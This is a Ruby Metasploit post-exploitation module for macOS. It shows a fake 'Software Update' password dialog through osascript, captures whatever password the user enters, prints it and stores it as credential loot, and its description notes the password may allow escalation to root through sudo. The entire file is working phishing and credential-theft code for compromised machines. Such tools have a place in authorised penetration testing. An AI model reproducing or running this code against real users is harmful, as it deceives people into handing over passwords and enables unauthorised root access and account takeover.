##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => "OS X Software Update Password Prompt",
      'Description'   => %q{
        This module attempts to phish the users password with a software update prompt. This module uses
        osascript to popup an application (System Preferences by default) with a dialog on top of it asking
        for the users password. Whatever password the user enters is returned back once the user presses OK.
        You may then be able to elevate to root with sudo if the user is an administrator.
      },
      'References'    =>
        [
          ['URL', 'http://www.gabrielserafini.com/blog/2008/08/19/mac-os-x-voices-for-using-with-the-say-command/']
        ],
      'License'       => MSF_LICENSE,
      'Author'        => [ 'timwr'],
      'Platform'      => [ 'osx' ],
      'SessionTypes'  => [ "meterpreter", "shell" ]
    ))

  register_options(
    [
      OptString.new('APPLICATION',  [true, 'The application to activate', "System Preferences"]),
      OptString.new('PROMPT', [true, 'The prompt to display', 'Software Update requires that you type your password to apply changes.']),
      OptString.new('TITLE', [true, 'The title to display', 'Software Update'])
    ], self.class)
  end

  def run
    application = datastore['APPLICATION']
    prompt = datastore['PROMPT']
    title = datastore['TITLE']
    osa_cmd = %Q|
osascript \
-e 'tell app "#{application}" to activate' \
-e 'tell app "#{application}" to display dialog "#{prompt}" & \
return & return default answer "" with icon 1 with hidden answer with title "#{title}"'
    |
    command_output = cmd_exec(osa_cmd)
    expected_output = 'button returned:OK, text returned:'
    if command_output.starts_with?(expected_output)
      password = command_output[expected_output.length,command_output.length]
      print_good("Password input: #{password}")
      p = store_loot(
        'osx.creds',
        'text/plain',
        session,
        password,
        'osx.creds.user',
        'OSX password'
      )
    else
      print_error("#{command_output}")
    end
  end

end
